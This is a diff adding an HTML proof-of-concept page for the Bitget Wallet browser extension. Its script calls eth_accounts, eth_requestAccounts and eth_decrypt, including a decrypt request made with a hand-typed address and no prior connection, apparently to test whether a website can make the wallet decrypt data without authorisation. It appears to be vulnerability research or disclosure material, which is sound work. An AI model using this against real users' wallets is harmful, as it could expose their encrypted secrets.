@@ -1,0 +1,138 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>Bitget Wallet eth_decrypt PoC</title>
+</head>
+<body>
+<h1>Bitget Wallet eth_decrypt PoC - GitHub Pages</h1>
+
+<p>Wallet address:</p>
+<input id="walletAddress" style="width:100%;" placeholder="0x..." />
+
+<p>Encrypted payload JSON:</p>
+<textarea id="ciphertext" style="width:100%;height:260px;"></textarea>
+
+<br><br>
+
+<button onclick="accounts()">1. eth_accounts</button>
+<button onclick="connect()">2. eth_requestAccounts</button>
+<button onclick="decryptWithoutConnect()">3. eth_decrypt using typed address</button>
+<button onclick="decryptUsingConnectedAccount()">4. eth_decrypt using connected account</button>
+
+<pre id="out"></pre>
+
+<script>
+function out(...items) {
+  const line = items.map((item) => {
+    try {
+      return typeof item === "string" ? item : JSON.stringify(item, null, 2);
+    } catch (e) {
+      return String(item);
+    }
+  }).join(" ");
+
+  console.log(line);
+  document.getElementById("out").textContent += line + "\n";
+}
+
+function provider() {
+  return window.bitkeep?.ethereum || window.ethereum;
+}
+
+window.accounts = async function () {
+  out("\n==== eth_accounts ====");
+  out("origin:", location.origin);
+  out("provider exists:", !!provider());
+
+  try {
+    const result = await provider().request({
+      method: "eth_accounts",
+      params: []
+    });
+
+    out("eth_accounts result:", result);
+  } catch (e) {
+    out("eth_accounts error:", e);
+  }
+};
+
+window.connect = async function () {
+  out("\n==== eth_requestAccounts ====");
+  out("origin:", location.origin);
+  out("provider exists:", !!provider());
+
+  try {
+    const result = await provider().request({
+      method: "eth_requestAccounts",
+      params: []
+    });
+
+    out("eth_requestAccounts result:", result);
+
+    if (result && result[0]) {
+      document.getElementById("walletAddress").value = result[0];
+    }
+  } catch (e) {
+    out("eth_requestAccounts error:", e);
+  }
+};
+
+window.decryptWithoutConnect = async function () {
+  out("\n==== eth_decrypt using typed address ====");
+  out("origin:", location.origin);
+
+  try {
+    const address = document.getElementById("walletAddress").value.trim();
+    const encryptedPayload = JSON.parse(document.getElementById("ciphertext").value);
+
+    out("address param:", address);
+    out("encrypted payload:", encryptedPayload);
+
+    const plaintext = await provider().request({
+      method: "eth_decrypt",
+      params: [encryptedPayload, address]
+    });
+
+    out("DECRYPTED PLAINTEXT:", plaintext);
+  } catch (e) {
+    out("eth_decrypt error:", e);
+  }
+};
+
+window.decryptUsingConnectedAccount = async function () {
+  out("\n==== eth_decrypt using connected account ====");
+  out("origin:", location.origin);
+
+  try {
+    const accounts = await provider().request({
+      method: "eth_accounts",
+      params: []
+    });
+
+    out("eth_accounts before decrypt:", accounts);
+
+    const from = accounts[0];
+
+    if (!from) {
+      throw new Error("No connected account. Click eth_requestAccounts first.");
+    }
+
+    const encryptedPayload = JSON.parse(document.getElementById("ciphertext").value);
+
+    out("from:", from);
+    out("encrypted payload:", encryptedPayload);
+
+    const plaintext = await provider().request({
+      method: "eth_decrypt",
+      params: [encryptedPayload, from]
+    });
+
+    out("DECRYPTED PLAINTEXT:", plaintext);
+  } catch (e) {
+    out("eth_decrypt error:", e);
+  }
+};
+</script>
+</body>
+</html>
